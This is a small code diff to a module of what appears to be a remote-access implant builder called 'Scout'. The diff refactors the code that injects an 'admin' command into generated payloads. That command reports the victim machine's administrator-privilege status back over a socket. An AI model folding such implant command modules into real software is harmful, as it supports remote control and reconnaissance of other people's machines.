@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -12,7 +11,7 @@ def main(option):
         config.import_statements.append('from ctypes import windll')
         config.functions.append('''
 def admin():
-    main_send('[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0), s)''')
+    send_all(s,'[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0))''')
         config.logics.append('''
             elif command == "admin":
                 admin()''')
